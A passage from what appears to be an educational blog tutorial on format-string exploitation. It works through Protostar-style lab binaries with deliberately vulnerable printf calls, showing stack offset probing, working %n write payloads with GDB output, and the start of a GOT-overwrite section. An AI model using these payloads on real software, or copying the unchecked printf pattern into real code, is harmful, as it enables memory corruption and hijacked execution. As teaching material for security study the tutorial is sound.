<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">conti</span>
<span class="nf">Continuing.</span>
<span class="nf">Good</span> <span class="nv">job</span> <span class="err">!</span>
<span class="err">[</span><span class="nf">Inferior</span> <span class="mi">1</span> <span class="p">(</span><span class="nv">process</span> <span class="mi">1118</span><span class="p">)</span> <span class="nv">exited</span> <span class="nv">normally</span><span class="p">]</span>
<span class="nl">Warning:</span> <span class="nf">not</span> <span class="nv">running</span> <span class="nv">or</span> <span class="nv">target</span> <span class="nv">is</span> <span class="nv">remote</span>          
</code></pre></div></div>

<p>Done ! It’s not that easy to grasp the concept but with some practice you’ll get it !</p>

<h2 id="use-cases">Use Cases<a class="header-link" href="https://axcheron.github.io/exploit-101-format-strings/#use-cases" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>We got the concept. Now, we’ll try some practical exercises to make sure you master this skill !</p>

<h3 id="random-write">Random Write<a class="header-link" href="https://axcheron.github.io/exploit-101-format-strings/#random-write" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h3>

<p>Let’s start with a simple one. Here we got a <em>target</em> variable, the goal is to replace this value with anything to make the condition true. FYI, unitialized variables are set to 0.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="c1">// gcc -static -z execstack -z norelro -fno-stack-protector -o format1 format1.c</span>
<span class="c1">// Ref. https://exploit-exercises.com/protostar/format1/</span>

<span class="kt">int</span> <span class="n">target</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
  
  <span class="k">if</span><span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"you have modified the target :)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>As <strong>target</strong> is outside the scope of a function, it will be located in the <em>.bss</em> of the binary. We can find it easily using the following command :</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>objdump <span class="nt">-t</span> ./format1 | <span class="nb">grep </span>target
080ebaa0 g     O .bss	00000004 target
</code></pre></div></div>

<p>Now, we have to find at which offset our argument (in fact, our inout) will be in the stack, we can <em>bruteforce</em> that easily :</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./format1 AAAA%x.%x.%x.%x.%x.%x%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x

AAAAbffff5e0.1.80489b8.2.8048190.bffff5088048a1e.bffff6fb.49656e69.0.8048a06.80ea110.bffff520.0.8048c5e.80ea0bc.49656e69.0.8048c5e.2.bffff5d4.bffff5e0.bffff544.0.2.bffff5d4.80489f0.0.8048190.80ea0bc.49656e69.0.65a8ab54.935aa23b.0.0.0.0.0.0.756e6547.1.8048ff4.8049580.8049620.0.bffff5cc.6.3c.3.30.0.2.0.8048880.80489f0.2.bffff5d4.8049580.8049620.0.bffff5cc.0.2.bffff6f1.bffff6fb.0.bffff8a1.bffffe5d.bffffe91.bffffea2bffffeb5.bffffebf.bffffed3.bffffee3.bfffff05.bfffff18.bfffff2c.bfffff40.bfffff50.bfffff58.bfffff6a.bfffff77.bfffff96.bfffffd4.bfffffe6.0.20.b7ffecf0.21.b7ffe000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.5.7.0.8.0.9.804885f.b.3e8.c.3e8.d.3e8.e.3e8.17.0.19.bffff6db.1f.bffffff2.f.bffff6eb.0.0.0.0.df000000.75be3dcc.ba15cd21.c9285987.69096277.363836.662f2e00.616d726f.41003174.25414141.78252e78
</code></pre></div></div>

<p>Well, it seems to be between argument 141 and 142 :</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./format1 AAAA%141<span class="se">\$</span>p
AAAA0x41410031
<span class="nv">$ </span>./format1 AAAA%142<span class="se">\$</span>p
AAAA0x31254141
</code></pre></div></div>

<p>That’s not really a problem, we just need to add some chars…</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./format1 AAAABB%141<span class="se">\$</span>p
AAAABB0x41414141
</code></pre></div></div>

<p>Now, we have to replace the A’s with the address of <em>target</em>.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./format1 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\xa0\xba\x0e\x08BB%141\$n"'</span><span class="sb">`</span>
?BByou have modified the target :<span class="o">)</span>
</code></pre></div></div>

<p>Ok, that was an easy one !</p>

<h3 id="precision-write">Precision Write<a class="header-link" href="https://axcheron.github.io/exploit-101-format-strings/#precision-write" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h3>

<p>This exercise is similar to the first one, but this time we have to write <strong>64</strong> into <em>target</em></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="c1">// gcc -static -z execstack -z norelro -fno-stack-protector -o format2 format2.c</span>

<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">target</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>

  <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
  
  <span class="k">if</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"you have modified the target !</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span> 
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">vuln</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>First, let’s find our argument on the stack…</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./format2 
AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
AAAA00000200.080ea400.080489bb.00000000.00000000.00000000.41414141.78383025.3830252e
user@gdb:~/demo<span class="nv">$ </span>./format2 
AAAA%7<span class="nv">$p</span>
AAAA0x41414141
</code></pre></div></div>

<p>It seems to be the 7th argument. Now we need to find the address of <em>target</em> and write <strong>64</strong> at this address. Let’s run <strong>GDB</strong> and place a breakpoint at the <em>if</em> condition.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span> <span class="nv">gdb</span> <span class="o">-</span><span class="nv">q</span> <span class="nv">format2</span> 
<span class="nf">Reading</span> <span class="nv">symbols</span> <span class="nv">from</span> <span class="nv">format2...</span><span class="p">(</span><span class="nv">no</span> <span class="nv">debugging</span> <span class="nv">symbols</span> <span class="nv">found</span><span class="p">)</span><span class="nv">...done.</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nb">di</span><span class="nv">sas</span> <span class="nv">vuln</span>
<span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">vuln</span><span class="p">:</span>
   <span class="err">0</span><span class="nf">x080489ac</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">ebp</span>
   <span class="err">0</span><span class="nf">x080489ad</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">ebp</span><span class="p">,</span><span class="nb">esp</span>
   <span class="err">0</span><span class="nf">x080489af</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">ebx</span>
   <span class="err">0</span><span class="nf">x080489b0</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x214</span>
   <span class="err">0</span><span class="nf">x080489b6</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x8048890</span> <span class="o">&lt;</span><span class="nv">__x86.get_pc_thunk.bx</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x080489bb</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">ebx</span><span class="p">,</span><span class="mh">0xa16f5</span>
   <span class="err">0</span><span class="nf">x080489c1</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0x0</span>
   <span class="err">0</span><span class="nf">x080489c8</span> <span class="o">&lt;+</span><span class="mi">28</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="mh">0x80ea55c</span>
   <span class="err">0</span><span class="nf">x080489ce</span> <span class="o">&lt;+</span><span class="mi">34</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x080489d0</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x4</span>
   <span class="err">0</span><span class="nf">x080489d3</span> <span class="o">&lt;+</span><span class="mi">39</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x080489d4</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="mh">0x200</span>
   <span class="err">0</span><span class="nf">x080489d9</span> <span class="o">&lt;+</span><span class="mi">45</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x20c</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x080489df</span> <span class="o">&lt;+</span><span class="mi">51</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x080489e0</span> <span class="o">&lt;+</span><span class="mi">52</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x804f5f0</span> <span class="o">&lt;</span><span class="nv">fgets</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x080489e5</span> <span class="o">&lt;+</span><span class="mi">57</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="err">0</span><span class="nf">x080489e8</span> <span class="o">&lt;+</span><span class="mi">60</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="err">0</span><span class="nf">x080489eb</span> <span class="o">&lt;+</span><span class="mi">63</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x20c</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x080489f1</span> <span class="o">&lt;+</span><span class="mi">69</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x080489f2</span> <span class="o">&lt;+</span><span class="mi">70</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x804f1d0</span> <span class="o">&lt;</span><span class="nv">printf</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x080489f7</span> <span class="o">&lt;+</span><span class="mi">75</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="err">0</span><span class="nf">x080489fa</span> <span class="o">&lt;+</span><span class="mi">78</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0x40</span> <span class="c1">; Right here !</span>
   <span class="err">0</span><span class="nf">x080489fe</span> <span class="o">&lt;+</span><span class="mi">82</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jne</span>    <span class="mh">0x8048a12</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">102</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x08048a00</span> <span class="o">&lt;+</span><span class="mi">84</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="err">0</span><span class="nf">x08048a03</span> <span class="o">&lt;+</span><span class="mi">87</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebx</span><span class="o">-</span><span class="mh">0x2da08</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x08048a09</span> <span class="o">&lt;+</span><span class="mi">93</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x08048a0a</span> <span class="o">&lt;+</span><span class="mi">94</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x804fa00</span> <span class="o">&lt;</span><span class="nv">puts</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x08048a0f</span> <span class="o">&lt;+</span><span class="mi">99</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="err">0</span><span class="nf">x08048a12</span> <span class="o">&lt;+</span><span class="mi">102</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">nop</span>
   <span class="err">0</span><span class="nf">x08048a13</span> <span class="o">&lt;+</span><span class="mi">103</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">ebx</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x08048a16</span> <span class="o">&lt;+</span><span class="mi">106</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">leave</span>  
   <span class="err">0</span><span class="nf">x08048a17</span> <span class="o">&lt;+</span><span class="mi">107</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">ret</span>    
<span class="nf">End</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">dump.</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">break</span> <span class="o">*</span><span class="mh">0x080489fa</span>
<span class="nf">Breakpoint</span> <span class="mi">1</span> <span class="nv">at</span> <span class="mh">0x80489fa</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">run</span>
<span class="nf">Starting</span> <span class="nv">program</span><span class="p">:</span> <span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">user</span><span class="o">/</span><span class="nv">demo</span><span class="o">/</span><span class="nv">format2</span> 
<span class="nf">TEST</span>   
<span class="nf">TEST</span>

<span class="err">[----------------------------------</span><span class="nf">registers</span><span class="o">-----------------------------------</span><span class="p">]</span>
<span class="nl">EAX:</span> <span class="err">0</span><span class="nf">x5</span> 
<span class="nl">EBX:</span> <span class="err">0</span><span class="nf">x80ea0b0</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="nl">ECX:</span> <span class="err">0</span><span class="nf">x80eddf8</span> <span class="p">(</span><span class="err">"</span><span class="nv">TEST</span><span class="err">\</span><span class="nv">n</span><span class="err">"</span><span class="p">)</span>
<span class="nl">EDX:</span> <span class="err">0</span><span class="nf">x80eb574</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="nl">ESI:</span> <span class="err">0</span><span class="nf">x80ea0bc</span> <span class="o">--&gt;</span> <span class="mh">0x80680c0</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">__strcpy_sse2</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">])</span>
<span class="nl">EDI:</span> <span class="err">0</span><span class="nf">x49656e69</span> <span class="p">(</span><span class="err">'</span><span class="nv">ineI</span><span class="err">'</span><span class="p">)</span>
<span class="nl">EBP:</span> <span class="err">0</span><span class="nf">xbffff668</span> <span class="o">--&gt;</span> <span class="mh">0xbffff678</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="nl">ESP:</span> <span class="err">0</span><span class="nf">xbffff450</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="nl">EIP:</span> <span class="err">0</span><span class="nf">x80489fa</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">78</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0x40</span><span class="p">)</span>
<span class="nl">EFLAGS:</span> <span class="err">0</span><span class="nf">x286</span> <span class="p">(</span><span class="nv">carry</span> <span class="nv">PARITY</span> <span class="nv">adjust</span> <span class="nv">zero</span> <span class="nb">SI</span><span class="nv">GN</span> <span class="nv">trap</span> <span class="nv">INTERRUPT</span> <span class="nb">di</span><span class="nv">rection</span> <span class="nv">overflow</span><span class="p">)</span>
<span class="err">[-------------------------------------</span><span class="nf">code</span><span class="o">-------------------------------------</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x80489f1</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">69</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x80489f2</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">70</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x804f1d0</span> <span class="o">&lt;</span><span class="nv">printf</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x80489f7</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">75</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x10</span>
<span class="err">=&gt;</span> <span class="err">0</span><span class="nf">x80489fa</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">78</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0x40</span>
   <span class="err">0</span><span class="nf">x80489fe</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">82</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jne</span>    <span class="mh">0x8048a12</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">102</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x8048a00</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="err">0</span><span class="nf">x8048a03</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">87</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebx</span><span class="o">-</span><span class="mh">0x2da08</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x8048a09</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">+</span><span class="mi">93</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">eax</span>
<span class="err">[------------------------------------</span><span class="nf">stack</span><span class="o">-------------------------------------</span><span class="p">]</span>
<span class="err">0000|</span> <span class="err">0</span><span class="nf">xbffff450</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0004|</span> <span class="err">0</span><span class="nf">xbffff454</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0008|</span> <span class="err">0</span><span class="nf">xbffff458</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0012|</span> <span class="err">0</span><span class="nf">xbffff45c</span> <span class="p">(</span><span class="err">"</span><span class="nv">TEST</span><span class="err">\</span><span class="nv">n</span><span class="err">"</span><span class="p">)</span>
<span class="err">0016|</span> <span class="err">0</span><span class="nf">xbffff460</span> <span class="o">--&gt;</span> <span class="mh">0xa</span> <span class="p">(</span><span class="err">'\</span><span class="nv">n</span><span class="err">'</span><span class="p">)</span>
<span class="err">0020|</span> <span class="err">0</span><span class="nf">xbffff464</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0024|</span> <span class="err">0</span><span class="nf">xbffff468</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0028|</span> <span class="err">0</span><span class="nf">xbffff46c</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">[------------------------------------------------------------------------------]</span>
<span class="nl">Legend:</span> <span class="nf">code</span><span class="p">,</span> <span class="nv">data</span><span class="p">,</span> <span class="nv">rodata</span><span class="p">,</span> <span class="nv">value</span>

<span class="nf">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x080489fa</span> <span class="nv">in</span> <span class="nv">vuln</span> <span class="p">()</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">x</span><span class="o">/</span><span class="nv">x</span> <span class="kc">$</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0xc</span>
<span class="err">0</span><span class="nl">xbffff65c:</span>	<span class="err">0</span><span class="nf">x00000000</span> <span class="c1">; Target address</span>
</code></pre></div></div>

<p>So, <em>target</em> is at <strong>0xbffff65c</strong>. Now, we just need to write the proper value at this address. The following input should do the trick : <code class="language-plaintext highlighter-rouge">"\x5c\xf6\xff\xbf%x60%7$n"</code>. Note that we only need to add <em>60</em> as the address is 4 bytes long.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">run</span> <span class="o">&lt;</span> <span class="o">&lt;</span><span class="p">(</span><span class="nv">python</span> <span class="o">-</span><span class="nv">c</span> <span class="err">'</span><span class="nv">print</span> <span class="err">"\</span><span class="nv">x5c</span><span class="err">\</span><span class="nv">xf6</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">xbf</span><span class="o">%</span><span class="mi">60</span><span class="nv">x</span><span class="o">%</span><span class="mi">7</span><span class="kc">$</span><span class="nv">n</span><span class="err">"'</span><span class="p">)</span>
<span class="nf">Starting</span> <span class="nv">program</span><span class="p">:</span> <span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">user</span><span class="o">/</span><span class="nv">demo</span><span class="o">/</span><span class="nv">format2</span> <span class="o">&lt;</span> <span class="o">&lt;</span><span class="p">(</span><span class="nv">python</span> <span class="o">-</span><span class="nv">c</span> <span class="err">'</span><span class="nv">print</span> <span class="err">"\</span><span class="nv">x5c</span><span class="err">\</span><span class="nv">xf6</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">xbf</span><span class="o">%</span><span class="mi">60</span><span class="nv">x</span><span class="o">%</span><span class="mi">7</span><span class="kc">$</span><span class="nv">n</span><span class="err">"'</span><span class="p">)</span>
<span class="err">\</span><span class="nf">???</span>                                                         <span class="mi">200</span>
<span class="nf">you</span> <span class="nv">have</span> <span class="nv">modified</span> <span class="nv">the</span> <span class="nv">target</span> <span class="err">!</span>
<span class="err">[</span><span class="nf">Inferior</span> <span class="mi">1</span> <span class="p">(</span><span class="nv">process</span> <span class="mi">5414</span><span class="p">)</span> <span class="nv">exited</span> <span class="nv">normally</span><span class="p">]</span>
<span class="nl">Warning:</span> <span class="nf">not</span> <span class="nv">running</span> <span class="nv">or</span> <span class="nv">target</span> <span class="nv">is</span> <span class="nv">remote</span>
</code></pre></div></div>

<p>Done !</p>

<h3 id="code-execution-redirect">Code Execution Redirect<a class="header-link" href="https://axcheron.github.io/exploit-101-format-strings/#code-execution-redirect" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h3>

<p>In this use case, we have to redirect the execution flow.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="c1">// gcc -z execstack -z norelro -no-pie -fno-stack-protector -o format4 format4.c</span>
<span class="c1">// Ref. https://exploit-exercises.com/protostar/format4/</span>

<span class="kt">void</span> <span class="nf">hello</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Code execution redirected !</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>

  <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>   
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">vuln</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Here, you should already have a good understanding of what we have to do. However, there is a trick. I’m sure that you think we need to overwrite the <em>return address</em> of <em>main()</em> with the address of <em>hello()</em>, but it won’t work…</p>

<p>Why ? Because <em>vuln()</em> calls <em>exit(1)</em> at the end of his routine. It means that we never return to <em>main()</em> ! So, what do we do now ? Well, we’ll use a trick called <strong>GOT Overwrite</strong>.</p>

